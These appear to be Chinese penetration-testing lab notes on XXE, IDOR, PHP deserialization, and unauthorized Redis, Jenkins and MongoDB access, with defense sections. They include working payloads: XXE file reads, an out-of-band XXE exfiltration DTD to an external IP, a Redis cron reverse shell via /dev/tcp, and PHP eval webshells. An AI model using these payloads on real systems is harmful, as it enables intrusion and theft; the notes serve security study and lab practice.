6. **文档表示**

   ​	在某些情况下，例如在使用DocBook或DITA的文档中，XML被用来描述文档的结构和内容。

7. **元数据表示**

   ​	XML可用于描述其他数据的数据（即元数据），如RDF和Dublin Core这样的框架中使用的那样。

8. **扩展性**

   ​	由于XML是可扩展的，组织可以定义自己的元素和结构，从而创建自定义的数据格式，如MathML（数学标记语言）和SVG（可缩放矢量图形）。

9. **跨平台**

   ​	由于XML是纯文本格式，它可以跨多个操作系统和编程语言使用，确保数据的一致性和完整性。

##### XML的基本组成部分

XML 文档结构包括 XML 声明、文档类型定义（DTD）、文档元素

```shell
<!--XML声明-->
<?xml version="1.0"?> 
<!--文档类型定义-->
<!DOCTYPE people [  <!--定义此文档是 people 类型的文档-->
  <!ELEMENT people (name,age,mail)>  <!--定义people元素有3个元素-->
  <!ELEMENT name (#PCDATA)>     <!--定义name元素为“#PCDATA”类型-->
  <!ELEMENT age (#PCDATA)>   <!--定义age元素为“#PCDATA”类型-->
  <!ELEMENT mail (#PCDATA)>   <!--定义mail元素为“#PCDATA”类型-->
]]]>
<!--文档元素-->
<people>
  <name>john</name>
  <age>18</age>
  <mail>john@qq.com</mail>
</people>

```



- **声明**：它定义了XML的版本和编码。
- **元素**：这是XML的核心部分，它表示数据和数据结构。
- **内容**：这是在XML元素中包含的实际数据。
- **属性**：为元素提供附加信息。

三者其中，与 XXE 漏洞相关的主要在于文档类型定义（DTD）

##### 实体（Entity）

​	在XML中，实体是一种用于表示数据的机制，通常被用来插入某些内容。

###### 预定义实体(内部实体)

​	XML预定义了一些实体用于特殊字符的转义，以防止它们被解析为XML标记。在XML中表示特殊字符，可以使用预定义的实体或字符引用。例如：

- `&lt;` 代表 `<`
- `&gt;` 代表 `>`
- `&amp;` 代表 `&`
- `&apos;` 代表 `'`
- `&quot;` 代表 `"`

###### 用户定义实体(内部实体)

一般实体的**声明**：`<!ENTITY 实体名称 "实体内容">`

**引用**一般实体的方法：`&实体名称;` 

​	在XML文档的DTD部分中，用户可以定义自己的实体，然后在文档的其他部分中使用这些实体。例如：

```xml
<!DOCTYPE note [
<!ENTITY myEntity "This is my custom text.">
]>
<note>
    &myEntity;
</note>
```

###### 参数实体(外部实体)

​	参数实体只能在DTD文件内部引用。但是可以在xml和dtd文档中将内容展开。

格式：`<!ENTITY % 实体名称 SYSTEM "实体内容" >`

```xml-dtd
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note [
    <!ELEMENT note ANY>
    <!ELEMENT auther (#PCDATA)>
    <!ENTITY xxe "test">
    <!ENTITY % xxs SYSTEM "./def.dtd">
    %xxs;				# 参数实体定义的变量必须先在dtd文件中引用
]>
<note>&vul;
    <auther>
        Carvin
    </auther>
    <flag>
        <url>
            &vul;
        </url>
    </flag>
</note>

<!--DTD-->
<!ENTITY xml "123">
<!ENTITY vul SYSTEM "file:///C:/Windows/system.ini">
<!ENTITY % element "<!ELEMENT flag (url)>">
%element;
```





###### 外部实体引用

注意：引入外部的DTD文件时，dtd文件中存放的就是xml代码，并且引用外部实体的时候还可以使用各种伪协议，而不是仅限于http协议

​	XML可以通过外部实体引用DTD文档，为当前的文档添加约束

```xml-dtd
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE html SYSTEM "./2.dtd">

<html>
    <head>
        <title>
            AAA
        </title>
    </head>
    <body>
        <a href='http://www.baidu.com'>Click</a>
    </body>
</html>

<!--2.DTD-->
<!ELEMENT html ANY>
<!ELEMENT head (title)>
<!ELEMENT title (#PCDATA)>
<!ELEMENT body (a)>
<!ELEMENT a (#PCDATA)>
    <!ATTLIST a href CDATA #REQUIRED> 
```



| 实体类型 | 内部实体                       | 外部实体                            |
| -------- | ------------------------------ | ----------------------------------- |
| 语法     | <!ENTITY 实体名称 "实体的值">  | <!ENTITY 实体名称 SYSTEM "URI/URL"> |
| 例子     | <!ENTITY writer "Bill G ates"> | <!ENTITY writer SYSTEM "DTD1.dtd">  |
| XML例子  | <author>&writer;</author>      | <author>&writer;</author>           |



### Lab-1 (有回显)

**检测漏洞：**

判断是否存在XXE漏洞呢？其实就是看他是否能够解析XML数据，所以我们直接传入一段XML代码看他能否解析

我们放入下面这段代码

```xml-dtd
<?xml version = "1.0"?> 
<!DOCTYPE name 
    [ <!ENTITY hacker "test"> ]> 
<name>&hacker;</name>
```

这段代码都能看懂吧,就是给name变量赋了一个test值，把代码放到输入框中，点击提交，结果如下

![image-20230909105732413](C:\Users\16159\AppData\Roaming\Typora\typora-user-images\image-20230909105732413.png)


 成功提取到test数据，说明有可能存在XXE漏洞
```php
#lab_1.php	该php文件可检查xml文档语法是否正确
<?php

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $xmlData = file_get_contents('php://input');

    // 使用DOMDocument进行XML验证
    $dom = new DOMDocument();

    // 从字符串加载XML
    // 这里的libxml_use_internal_errors是关键。它允许我们捕获加载时的错误，而不是直接输出它们
    libxml_use_internal_errors(true);
    libxml_disable_entity_loader (false);

    if ($dom->loadXML($xmlData, LIBXML_NOENT | LIBXML_DTDLOAD)) {
        echo "XML格式正确！";
        $node = $dom->getElementsByTagName('bookstore')->item(0);
        echo $dom->saveXML($node);

    } else {
        echo "XML格式有误：<br>";
        $errors = libxml_get_errors();
        foreach ($errors as $error) {
            echo "行{$error->line}列{$error->column}: {$error->message}<br>";
        }
        libxml_clear_errors();
    }
} else {
    // 说明如何使用这个脚本
    echo "请通过POST方法发送XML数据进行格式验证。";
}
```

- `$dom = new DOMDocument();`
  - 创建一个新的`DOMDocument`对象。这个对象提供了一个接口来操作XML文档。
- `$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);`
  - 使用`loadXML`方法加载从`php://input`获取的XML数据。
  - `LIBXML_NOENT`和`LIBXML_DTDLOAD`是传递给`loadXML`的标志。`LIBXML_NOENT`标志告诉libxml将所有实体展开为它们的值。`LIBXML_DTDLOAD`告诉libxml加载文档类型定义（DTD）。

**Payload1**

直接外部实体注入，就是通过协议直接执行恶意命令

因为我是windows主机，这里我们以**file协议**来读取**c:/windows/win.ini**配置文件的内容，xml代码如下(注意这里的路径需要改变写法，不然会受到转义的影响)

```xml-dtd
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE creds [  
<!ENTITY goodies SYSTEM "file:///C:/Windows/system.ini"> ]> 
<creds>&goodies;</creds>
```

**Payload2**

```xml-dtd
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE creds [  
<!ENTITY goodies SYSTEM "php://filter/read=convert.base64-encode/resource=http://XXE/test.txt"> ]> 
<creds>&goodies;</creds>
```

### *Lab-2无回显 (Blind OOB XXE)

数据带外

**Payload**

```xml-dtd
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE convert [ 
<!ENTITY % remote SYSTEM "http://XXE/lab_2_payload.dtd">
%remote;%int;%send;
]>

<!-- lab_2_payload.dtd -->
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=http://XXE/test.txt">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://110.120.2.67:9000?p=%file;'>">
```

### XXE 漏洞利用工具



#### 1.XXEinjector

[readma_zh.md](C:\Users\16159\Desktop\网安\渗透\XXE\XXEinjector-master\readme_zh.md)

推荐一款综合型的 XXE 漏洞利用工具XXEinjector，用 Ruby 开发，运行前需要先安装 ruby。

```shell
sudo apt install ruby
```

通过输入请求包数据，并指定攻击行为，比如列目录、读文件等。

```bash
$ cat req.txt                                                                             
GET /mmpaymd/ordercallback HTTP/1.1
Host: 100.95.204.69:8081
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh,zh-CN;q=0.9,en;q=0.8
Cache-Control: max-age=259200
Connection: keep-alive
```

常用命令如下：

![Drawing 3.png](https://s0.lgstatic.com/i/image2/M01/05/79/Cip5yGAABwiAda6kAAF5gVHcGUo024.png)


​																	图 4 XXEinjector 常用命令

不过，不能完全依赖于 XXEinjector，因为之前我在测试时，发现它也有利用不成功的情况，需要自己多测试验证下。

其他更多 XXE payload，可以参考“XML External Entity (XXE) Injection Payload List”。

#### 2.XXExploiter

[readme_zh.md](C:\Users\16159\Desktop\网安\渗透\XXE\xxexploiter-master\readme_zh.md)

如果你记不住上面那些 XXE payload，还有个工具可以帮你生成，一款集 payload 生成与发包利用的 XXE 利用工具 XXExploiter，它可以启动服务提供远程 DTD 文件去实现利用。

![图片5.png](https://s0.lgstatic.com/i/image2/M01/06/D8/CgpVE2AGWfCAdbhhAAQe4lr3PMM251.png)

​																		图 5 xxeploiter 利用方法

就功能而言，个人觉得它比 XXEinjector 更优秀，生成 payload 的功能还可以用于辅助手工测试，结合业务场景自己做一些调整。

### **XXE漏洞修复与防御**

xxe漏洞存在是因为XML解析器解析了用户发送的不可信数据。然而，要去校验DTD(document type definition)中SYSTEM标识符定义的数据，并不容易，也不大可能。大部分的XML解析器默认对于XXE攻击是脆弱的。因此，最好的解决办法就是配置XML处理器去使用本地静态的DTD，不允许XML中含有任何自己声明的DTD。通过设置相应的属性值为false，XML外部实体攻击就能够被阻止。因此，可将外部实体、参数实体和内联DTD 都被设置为false，从而避免基于XXE漏洞的攻击。

**防御方案一：使用开发语言提供的禁用外部实体的方法**

PHP

```
libxml_disable_entity_loader(true);
```

JAVA

```
DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
dbf.setExpandEntityReferences(false);
```

Python

```
from lxml import etree
xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
```



**防御方案二：过滤用户提交的XML数据**

过滤关键词：<!DOCTYPE和<!ENTITY，或者SYSTEM和PUBLIC



## 9. 越权漏洞

[越权漏洞简单分析](https://blog.csdn.net/lyc1401070320/article/details/83410065?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169309909216800182790788%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=169309909216800182790788&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-83410065-null-null.142^v93^chatsearchT3_1&utm_term=%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E&spm=1018.2226.3001.4187)

### 原理

越权（也称为权限提升或权限绕过）是指用户或进程获得并使用了它本不应获得的权限、角色或功能。其通常是由于不恰当的权限配置、程序错误或漏洞所导致，允许攻击者执行他们不应该能够执行的操作。

### 分类

**水平越权**

​	访问与其同等权限的其他用户的资源

**垂直越权**

​	访问系统中更高级别的资源或执行更多的操作

### 产生条件

​    通常情况下，一个 Web 程序功能流程是登录 - 提交请求 - 验证权限 - 数据库查询 - 返回结果。如果验证权限不足，便会导致越权。常见的程序都会认为通过登录后即可验证用户的身份，从而不会做下一步验证，即验证权限，最后导致越权。

1，通过隐藏 URL

实现控制访问有些程序的管理员的管理页面只有管理员才显示，普通用户看不到，利用 URL 实现访问控制，但 URL 泄露或被恶意攻击者猜到后，这会导致越权攻击。

2，直接对象引用

这种通过修改一下参数就可以产生水平越权，例如查看用户信息页面 URL 后加上自己的 id 便可查看，当修改为他人的 ID 号时会返回他人的信息，便产生了水平越权。

3，多阶段功能

多阶段功能是一个功能有多个阶段的实现。例如修改密码，可能第一步是验证用户身份信息，号码验证码类的。当验证成功后，跳到第二步，输入新密码，很多程序会在这一步不再验证用户身份，导致恶意攻击者抓包直接修改参数值，导致可修改任意用户密码。

4, 静态文件

很多网站的下载功能，一些被下载的静态文件，例如 pdf、word、xls 等，可能只有付费用户或会员可下载，但当这些文件的 URL 地址泄露后，导致任何人可下载，如果知道 URL 命名规则，则会便利服务器的收费文档进行批量下载。

5，平台配置错误

一些程序会通过控件来限制用户的访问，例如后台地址，普通用户不属于管理员组，则不能访问。但当配置平台或配置控件错误时，就会出现越权访问。

### 检测工具

BP

### 如何查找越权漏洞

​		在与服务器进行数据交互时客户端携带着标识用户的身份的cookie，当服务端的[session](https://so.csdn.net/so/search?q=session&spm=1001.2101.3001.7020)与cookie中的身份匹配成功后，才能允许该用户进行相关操作（cookie和session的关系-->一弹、二弹）。除了cookie之外，在请求中可能会带一些参数，细览下可能存在辨别信息的唯一值，来进行测试。这里要说一点，传输的参数并不一定在请求参数中，也有可能存在URL链接的位置（GET和POST请求的区别）。当拦截一个请求后分析是否有参数：

1、请求中**不存在参数**，只用cookie进行身份验证，无法水平越权，可能出现**垂直越权**；

2、请求中**存在参数**，并且参数中的某些值可能是辨别信息的唯一值（如employeeID、departmentID、ID等），可能存在水平和垂直越权；越权的原因是参数中的employeeID没有判断是否是cookie中用户所管辖的员工ID。

### 如何测试

对于渗透测试，可以对一些请求进行抓包操作，或者查看请求的 URL 地址，对于关键的参数修改下值查看下返回结果来初步判定。随后可以注册两个小号，相互辅助来确定是否存在越权。

常见的越权高发功能点有：根据订单号查订单、根据用户 ID 查看帐户信息、修改 / 找回密码等。

对于代码审计，可以先查看前端的网页源码，查看一些操作的表单提交的值。查看配置文件和一些过滤器，看是否对 URL 有相关的筛选操作。最后查看后台处理逻辑，是否存在身份验证机制，逻辑是否异常，有时的逻辑漏洞也可导致越权操作。

一般测试时，可以注册两个小号测试，更方便，大概流程图如下：

![img](https://img-blog.csdnimg.cn/20181026095935634.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2x5YzE0MDEwNzAzMjA=,size_27,color_FFFFFF,t_70)

### 如何修复

1，类似于这种请求，例如查看用户信息等，不能只根据用户 id 去搜索，应该再次进行身份验证。

2，可以从用户的加密认证 cookie 中获取当前用户 id，防止攻击者对其修改。或在 session、cookie 中加入不可预测、不可猜解的 user 信息。

3，在每个页面加载前进行权限认证。

4，特别敏感操作可以让用户再次输入密码或其他的验证信息。

## 10. 反序列化漏洞

[反序列化漏洞详解](https://blog.csdn.net/LJH1999ZN/article/details/123338591)

序列化就是把一个对象变成可以传输的字符串，目的就是为了方便传输。
反序列化和序列化是两个正好相反的过程。

#### 反序列化漏洞的原理：

序列化和反序列化本身并不存在问题。但当反序列化的数据可被用户控制，那么攻击者即可通过构造恶意输入，让反序列化产生非预期的对象，在此过程中执行构造的任意代码。
php比较少，Java中出现的很多，因为php中还需要满足后台不正当的使用了PHP中的魔法函数的条件

#### 类与对象

##### **定义**

​	==类（Class）==是对象的模板或蓝图，是实体或事物的抽象表示。它定义了用于创建对象的属性（有时称为字段、成员变量或状态）和方法（有时称为函数或行为）。

​	==对象（Object）==是基于类定义的实例。每个对象都有自己的属性值，但它共享同一个类的方法定义。

###### **方法（Method）**:

​	方法是类中定义的函数（行为），它描述了对象可以执行的操作。方法可以操作对象的内部状态。根据方法的可访问性。

###### **属性（Property）**

​	属性本质就是变量，一般来说，属性都用私有的，通过公有的方法对私有的属性进行赋值和取值。

```php
class MyClass {
    //定义一个私有的myProperty的属性
    private $myProperty;

    //定义一个公有的方法为私有属性赋值
    public function setProperty($value) {
        $this->myProperty = $value;
    }

    public function getProperty() {
        return $this->myProperty;
    }
}
//实例化
$obj = new MyClass();
$obj->setProperty("Some value");
echo $obj->getProperty();


//$this 是一个特殊的变量，它在类的方法内部引用调用该方法的对象实例。
//-> 用于从对象中访问属性或方法。
```

##### **子类**

​	子类（派生类）是基于另一个类（称为父类或基类）的拓展或特化。子类可以继承父类的属性和方法，并且可以添加或重写它们。子类继承其父类的公共和受保护的属性和方法，但不能继承私有属性和方法。

格式：`class ChildClass extends ParentClass {...}`

功能：允许代码重用、创建更具体或特化的行为。

##### 访问控制（可见性）

​	类中的方法和属性可以被定义为 public、private 或 protected。如果没有设置这些关键字，则该方法默认为 public。可以对 public 和 protected 进行重定义，但 private 而不能。

**1. Public**:

​	在PHP中，`public` 是一个可见性关键字。如果一个类的成员被声明为公有的，则可以从任何地方访问它。它是默认的可见性。

**2. Private**:

​	如果一个类的成员被声明为私有的，那么它只能在该类的内部被访问。这是一个封装的方法，确保外部代码不能意外地修改类的内部状态。

​	格式：`private $myPrivateVar;` 或 `private function myPrivateMethod()`。

**3. Protected:**

​	介于公共和私有之间，可以从定义它的类的内部访问，也可以从派生/子类中访问，但不能从类的外部访问。

```php
class ParentClass {
    protected function protectedMethod() {
        echo "This is a protected method.";
    }
}

class ChildClass extends ParentClass {
    public function callProtectedMethod() {
        $this->protectedMethod();  // 从子类中调用受保护的方法
    }
}

$obj = new ChildClass();
$obj->callProtectedMethod();  // 输出 "This is a protected method."
```

###### **引用关联**

​	通过引用，可以将一个对象的属性与另一个变量关联起来，从而使它们共享同一个值。

```php
class MyClass {
    public $myProperty;
}

$obj = new MyClass();
$anotherVar = & $obj->myProperty;  // 引用关联
$anotherVar = "Value through reference";
echo $obj->myProperty;  // 输出 "Value through reference"
```

#### 序列化

##### 对象序列化

示例说明：

​	假如存在Class A 与 Class B，B 中包含一个对Class A的引用，现将A，B实例为 a，b。

```php
class A {
    public $name;

    public function __construct($name) {
        $this->name = $name;
    }
}

class B {
    public $refToA;

    public function __construct($aInstance) {
        $this->refToA = $aInstance;
    }
}

$a = new A("Class A instance");
$b = new B($a);
```

​	此时，内存分配了两个空间用于存储对象a，b。接下来将它们写入磁盘，由于对象b包含对对象a的引用，系统会自动的将 a 的数据复制一份到 b ，而当我们恢复对象(重新加载到内存)时，内存分配了三个空间（a，b，a），如果这时需要修改 a 的数据，为使对象的数据保持一致，就需要查找到它的每一份拷贝。

​	对象序列化就是用来解决这个问题。所有php里面的值都可以使用函数`serialize()`来返回一个包含字节流的字符串来表示。`unserialize()`函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。

```php
 class S{

​    public $test="pikachu";

  }

  $s=new S(); //创建一个对象

  serialize($s); //把这个对象进行序列化
```

  序列化后得到的结果:

​	O:1:"S":1:{s:4:"test";s:7:"pikachu";}

​    O:代表object

​    1:代表对象名字长度为一个字符

​    S:对象的名称

​    1:代表对象里面有一个变量

​    s:数据类型

​    4:变量名称的长度

​    test:变量名称

​    s:数据类型

​    7:变量值的长度

​    pikachu:变量值

#### 魔术方法magic_fuction

需要知道：**触发时机**->**功能**->**参数**->**返回值**

##### __construct()

​	方法在实例化对象时自动调用，

通常用于初始化对象的属性或执行需要在实例化对象时进行的其他任务。

触发时机：实例化对象时

功能：提前清理不必要内容

参数：非必要

返回值：

```php
<?php 
class User {    
    public $name;    
    public function __construct($name) {        
        $this->name = $name;
        echo "触发魔术方法一次" ;
    } 
} 
$user = new User('John');   //实例化对象 触发一次
$user = new User('Danny');  //实例化对象 再触发一次

?>
```

##### __destruct()

​	析构函数，在对象的所有引用被删除或者当对象被显式销毁时执行的魔术方法

```php
#一、
class FileHandler {
    private $file;
    public function __construct($fileName) {
        $this->file = fopen($fileName, 'w');
    }
    public function __destruct() {
        fclose($this->file);
    }
}
$file = new FileHandler('test.txt');
unset($file);
//当$file对象被销毁时自动关闭文件

#二、
<?php
class User {
    public function __destruct(){
        echo "触发了析构函数1次";
    }
}

$test = new User("benben");     //实例化对象结束后，代码运行完会销毁，触发析构函数 destruct()
$ser = serialize($test);
unserialize($ser);              //反序列化结束后，代码运行完会销毁，触发析构函数 destruct()
?>

#三、
<?php
highlight_file(__FILE__);
error_reporting(0);
class User {
    var $cmd="echo 'dazhuang666!!';";
    public function __destruct(){
        eval ($this->cmd);
    }
}
$ser= $_GET["benben"];		
unserialize($ser);
?>
//在URL输入?benben=O:4:"User":1:{s:3:"cmd";s:21:"system('systeminfo');";}执行
```

##### **__sleep():**

**当使用 serialize)函数序列化对象时，此方法被调用。你可以用它来清理对象并返回一个包含对象中哪些属性需要被序列化的数组。**

```php
<?php

class MyClass{

public $datal = ‘one’;

private $data2 = ‘two’;

public function _sleep(){

return [‘data2’];

}

}

$obj = new MyClass();

echo serialize($obj); //只有$data1,会被反序列化

?>
```

 

##### **__wakeup();**

当使用unserialize(函数反序列化对象时，此方法被调用。通常用来重新建立对象可能需要的任何资源连接。

```php
<?php

class MyClass{

public $data = ‘something’;

public function _wekeup(){

$this->data = ‘reinitialized’;

}

}

$serializedData = serialize(new myClass());

$obj = unserialize($serializedData);

echo $obj->data;    //输出’reinitialized’

?>
```

 

##### **__toString()**

此方法允许一个类决定如何回应被当作字符串使用的时候

。例如，eno一个对象将尝试调用对象的_tostring0 方法并输出其结果。这个方法必须返回一个字符串值，否则会产生一个致命错误。

```php
<?php

 class User {

  public $name;

  public function __construct($name) {

​    $this->name=$name;

  }

  public function __tostring() {

​    return "This is a User object of:".$this->name;

  }

}
```



## 11. 数据库未授权访问漏洞

[未授权访问漏洞汇总1](https://blog.csdn.net/weixin_57567655/article/details/126493671?ops_request_misc=&request_id=&biz_id=102&utm_term=%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-126493671.nonecase&spm=1018.2226.3001.4187)

[未授权访问漏洞汇总2](https://blog.csdn.net/weixin_46137328/article/details/108765335?ops_request_misc=&request_id=&biz_id=102&utm_term=%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-108765335.nonecase&spm=1018.2226.3001.4187)

[未授权访问漏洞汇总3](https://www.freebuf.com/articles/web/278245.html)

[未授权访问漏洞集合带环境及解题.pdf](C:\Users\16159\Desktop\网安\渗透\未授权访问漏洞集合带环境及解题.pdf)



### Redis 未授权（6379）

#### 介绍

​	**Redis** 是一个开源的、内存中的单线程的数据结构存储系统，可以用作数据库、缓存和消息代理。

​	Redis的所有数据都存储在内存中，并使用RDB 快照和 AOF 日志文件持久化数据。它支持多种数据结构，包括：字符串、列表、集合、有序集合、哈希、位图、HyperLogLog 和地理空间索引。

**应用场景**

1. 内存缓存（电子商务网站）
2. 会话存储 (在线聊天应用）
3. 消息队列（分布式系统中）
4. 排行榜和计数（游戏应用）
5. 实时分析（流量监控系统）
6. 地理空间索引（餐厅搜索应用）
7. 时间序列查询（股票交易应用）

#### Redis基本使用

##### 基本命令

**连接**

* 本地：`redis-cli`
* 远程：`redis-cli -h host -p port -a password`

**keys操作**

- `EXISTS key`: 检查指定的 key 是否存在。
- `EXPIRE key seconds`: 设置 key 的过期时间（以秒为单位）。
- `TTL key`: 获取 key 的剩余生存时间。

**其他常用命令**

- `PING`: 检查 Redis 服务器是否运行。
- `SELECT index`: 切换到指定的数据库。
- `FLUSHDB`: 清空当前数据库的所有 key。
- `FLUSHALL`: 清空所有数据库的所有 key。

##### 数据类型

1. **字符串 (String)**

- 可以包含任何数据，例如文字、图片或序列化的对象。
- 最大能存储 512MB 的数据。

常用命令：
```mysql
  - SET key value: 设置指定 key 的值。
  - GET key: 获取指定 key 的值。
  - DEL key: 删除指定 key。
```

  

2. **列表 (List)**

- 简单的字符串列表，按插入顺序排序。
- 可以将元素添加到头部或尾部。

常用命令：

```mysql
LPUSH key value 	# 将一个或多个值插入到列表头部
RPUSH key value		# 将一个或多个值插入到列表尾部
LPOP key			# 移除并返回列表的第一个元素
RPOP key			# 移除并返回列表的最后一个元素
LLEN key			# 查看列表的长度
LINDEX key n		# 查看列表的第n个元素
LRANGE key 0 -1		# 查看列表的全部元素
```



3. **集合 (Set)**

- 无序的字符串集合。
- 不存在重复的元素。

常用命令：

```sql
SADD key member		# 将一个或多个成员元素加入到集合中
SMEMBERS key		# 返回集合中的所有成员
SREM key member		# 移除集合中的一个或多个成员元素
```



**有序集合 (Sorted Set)**

- 与 Set 类似，但每个元素都会关联一个分数。
- 元素根据分数进行排序。

常用命令：

```sql
ZADD key score member		# 添加一个或多个成员，或更新其分数
ZRANK key member			# 返回指定成员的索引
ZRANGE key start stop		# 根据索引返回范围内的成员
```



5. **哈希 (Hash)**

- 键值对的集合。
- 适合存储对象。

常用命令：

```sql
HSET key field value		# 设置哈希字段的字符串值
HGET key field				# 获取存储在哈希字段中的值
HDEL key field				# 删除哈希的一个或多个字段
HMSET key field1 value1 [field2 value2 ...]		# 设置多个哈希字段的值
```

#### 漏洞原理	

​	Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证(一般为空)的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器、添加计划任务、写入Webshell等操作。

#### 环境搭建

```bash
wget http://download.redis.io/releases/redis-2.8.17.tar.gz
tar xzvf redis-2.8.17.tar.gz 
cd redis-2.8.17
make
make PREFIX=/usr/local/bin/redis install
cd /usr/local/bin/redis/bin
./redis-server redis.conf 	#开启redis

firewall-cmd --add-service=http		#防火墙没有http的话还需要开启http服务
lsof -i :80 	#80端口要开启apache
```

##### 写shell

​	Redis的配置文件位于Redis安装目录下，文件名为redis.conf

​	可以通过CONFIG命令用于动态地在运行时修改 Redis 配置。默认情况下，RDB 文件保存在 Redis 的工作目录下，并命名为 `dump.rdb`。

注：`\r\n\r\n`代表换行的意思，用redis写入文件的会自带一些版本信息

```bash
config set dir /var/www/html
config set dbfilename test.php
set webshell "<?php phpinfo(); ?>\r\n\r\n"
save
```

然后发现可以访问到`靶机ip/test.php`,显示phpinfo界面

**然后开始进入激动的入侵时刻：**

​	手动生成 RDB 文件。但在RDB 文件生成完成前会阻止 Redis 为其它命令服务。为了避免这种情况出现，`BGSAVE` 命令，会在后台启动一个子进程来生成 RDB 文件，从而不阻塞主 Redis 进程。

```bash
在navicat中的redis客户端里，往靶机服务器里传入计划任务：
config set dir /var/spool/cron
config set dbfilename root
set -.- "\n\n\n* * * * * bash -i >& /dev/tcp/黑客机ip/5555 0>&1\n\n\n"
bgsave

黑客机开启监听：
nc -lvnp 5555
```

Nmap探测：`nmap -p 6379 --script redis-info <ip>`

#### 防御

- 禁止使用root权限启动redis服务

```bash
useradd-rM-s /sbin/nologin redis
chown -R redis:redis /usr/1ocal/bin/redis/redis-server
sudo -u redis redis-server redis.conf
```

- 启动密码认证

  ```bash
  # 临时设置
  ./redis-cli -h localhost -p 6379
  > config set requirepass 123456
  
  # 永久配置——redis.conf配置
  requirepass <passwd>
  ```


* redis.conf 配置密码添加 

  `requirepass < 密码 >`

* redis-cli -a <密码>或者在 redis-cli 内输入 auth <密码>进行验证

* 添加IP访问控制，并更改默认6379端口

  * bind
  * listen

### Jenkins（8080）

​	Jenkins 是一个用于创建[持续集成/持续交付](https://phoenixnap.com/blog/continuous-delivery-vs-deployment-vs-integration)（[CI/CD](https://phoenixnap.com/blog/what-is-ci-cd)）环境的平台。

漏洞简介以及危害：

默认情况下Jenkins面板中用户可以选择执行脚本界面来操作一些系统层命令，攻击者可通过未授权访问漏洞或者暴力破解用户密码等进入后台管理服务，通过脚本执行界面从而获取服务器权限。

#### 环境搭建：

##### JDK安装

**源码安装JDK**

​	http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html

```bash
mkdir -p /usr/java
tar -zvxf jdk-11.0.20-linux-x64_bin.tar.gz -C /usr/java
export PATH=$PATH:/usr/java/jdk-11.0.20
```

**yum安装**

```bash
yum install -y java-1.11.0-openjdk-devel
```

**配置java版本**

```bash
alternatives --config java
```



##### 安装jenkins

```bash
#添加Yum源
wget -O /etc/yum.repos.d/jenkins.repo https://pkg.jenkins.io/redhat-stable/jenkins.repo --no-check-certificate

#导入密钥
rpm --import https://pkg.jenkins.io/redhat-stable/jenkins.io.key

yum install -y jenkins

firewall-cmd --add-port=8080/tcp --permanent
firewall-cmd --reload

vim /etc/init.d/jenkins
```

**rpm包安装**

```bash
wget https://archives.jenkins.io/redhat/jenkins-1.625-1.1.noarch.rpm
rpm -ivh jenkins-1.625-1.1.noarch.rpm

#使用root启动jenkins
systemctl stop jenkins
java -jar /usr/lib/jenkins/jenkins.war
```



#### 未授权访问

目标靶机：

​	开启Jenkins服务： systemctl start jenkins

黑客机：	

​	访问http://靶场ip:8080/manage可以看到没有任何限制可以直接访问，通过脚本命令行界面可以执行命令，写入shell

​	点击“脚本命令执⾏”

​	执行系统命令：`println "whoami".execute().text`

​	⽹站路径：/var/www/html （需要具备⼀定的权限） 利⽤“脚本命令⾏”写webshell，点击运⾏没有报 错,写⼊成功：`new File ("/var/www/html/shell.php").write('<?php @eval($_REQUEST["cmd"]); ?>');`

​	如果未执行成功：去靶机里停掉jenkins，输入java -jar /usr/lib/jenkins/jenkins.war（#使用root启动jenkins）

​	如果未报错，说明上传成功，成功将写入的php上传到了靶机的httpd的根目录下（80端口），/var/www/html/shell.php，可以看到可以访问到`靶机ip/shell.php?cmd=phpinfo();`

​	就可以用蚁剑连接了

#### 防御

![image-20230827102741087](C:\Users\16159\AppData\Roaming\Typora\typora-user-images\image-20230827102741087.png)

![image-20230827102858713](C:\Users\16159\AppData\Roaming\Typora\typora-user-images\image-20230827102858713.png)



### mongodb(27017)

默认端口27017

​	开启MongoDB服务时不添加任何参数时,默认是没有权限验证的,登录的用户可以通过默认端口无需密码对数据库任意操作（增、删、改、查高危动作）而且可以远程访问数据库。

  造成未授权访问的根本原因就在于启动 Mongodb 的时候未设置 --auth 也很少会有人会给数据库添加上账号密码（默认空口令），使用默认空口令这将导致恶意攻击者无需进行账号认证就可以登陆到数据服务器。

#### 环境安装

